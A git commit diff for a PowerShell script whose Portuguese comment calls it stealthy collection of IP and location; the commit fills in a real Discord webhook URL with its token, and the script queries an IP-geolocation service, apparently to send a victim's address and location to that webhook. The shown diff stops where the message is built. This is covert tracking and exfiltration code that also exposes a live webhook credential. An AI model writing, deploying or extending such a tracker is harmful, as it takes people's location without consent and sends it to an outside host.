e6a0952507128a21cb415f9eedcbbac053c1b480
arthurboby <arthurlourencopaixao57@gmail.com>
2026-05-17 20:40:26 -0300

    Update ip_info.ps1

--- coleta/ip_info.ps1
+++ coleta/ip_info.ps1
@@ -1,5 +1,5 @@
 # Coleta de IP e Localização Furtiva
-$webhook = "SUA_URL_DO_WEBHOOK"
+$webhook = "https://discord.com/api/webhooks/1505693050175885342/6LSI1HJR2XcmSAgBP2c-C5wnDhd6CHqh9vBIxIxr6l7ExhN0S2Eiyj4vEAmoL0kQlGkL"
 $info = Invoke-RestMethod -Uri "http://ip-api.com"
 
 $msg = @{
